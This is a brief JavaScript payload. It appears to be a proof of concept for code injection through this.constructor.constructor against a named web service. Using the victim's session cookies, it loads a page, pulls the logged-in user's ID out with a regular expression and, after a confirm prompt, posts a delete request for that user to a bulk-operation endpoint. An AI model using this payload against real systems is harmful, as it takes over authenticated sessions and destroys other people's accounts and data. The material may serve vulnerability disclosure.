this.constructor.constructor(`
fetch('https://suitex.simplify360.com/Group',{credentials:'include'})
.then(r=>r.text())
.then(t=>{let id=t.match(/var currUserId = ['"](\\d+)['"]/)[1];
if(confirm('Delete '+id+'?'))
fetch('https://suitex.simplify360.com/bulkOperationUser',{method:'POST',credentials:'include',body:'ids='+id+'&type=delete'})
})`)()
